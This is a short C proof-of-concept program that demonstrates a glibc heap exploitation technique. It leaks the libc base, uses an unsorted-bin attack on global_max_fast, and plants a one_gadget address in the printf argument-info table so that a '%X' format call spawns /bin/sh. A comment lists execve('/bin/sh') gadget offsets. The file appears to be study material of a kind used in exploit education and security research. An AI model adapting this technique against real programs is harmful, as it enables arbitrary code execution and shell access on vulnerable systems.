// gcc -g -fPIE -no-pie -o test
#include <stdio.h>
#include <stdlib.h>

/*
one gadget
0x45226 execve("/bin/sh", rsp+0x30, environ)
0x4527a execve("/bin/sh", rsp+0x30, environ)
0xf03a4 execve("/bin/sh", rsp+0x50, environ)
0xf1247 execve("/bin/sh", rsp+0x70, environ)
*/

#define fastbinsY 0x3c4b28
#define global_max_fast 0x3c67f8
#define printf_arginfo_table 0x3c5730
#define printf_function_table 0x3c9468
#define one_gadget 0x4527a


int main(int argc, char** argv)
{
	setbuf(stdout, NULL);
	long long *a, *arg_table, *func_table, *d;
	long long libc_base;
	long long arg_size = (printf_arginfo_table-fastbinsY)*2+0x10;
	long long func_size = (printf_function_table-fastbinsY)*2+0x10;
	a = malloc(0x80);
	arg_table = malloc(arg_size);
	func_table = malloc(func_size);
	malloc(0x10);
	free(a);
	libc_base = *a - 0x3c4b78;
	printf("\033[32mlibc base:%llx\033[0m\n", libc_base);	
	a[1] = global_max_fast+libc_base-0x10;
	malloc(0x80);
	
	arg_table['X'-2] = one_gadget+libc_base;
	//func_table['X'-2] = one_gadget+libc_base;
	free(arg_table);
	free(func_table);
	printf("%X", 0);
	return 0;
}
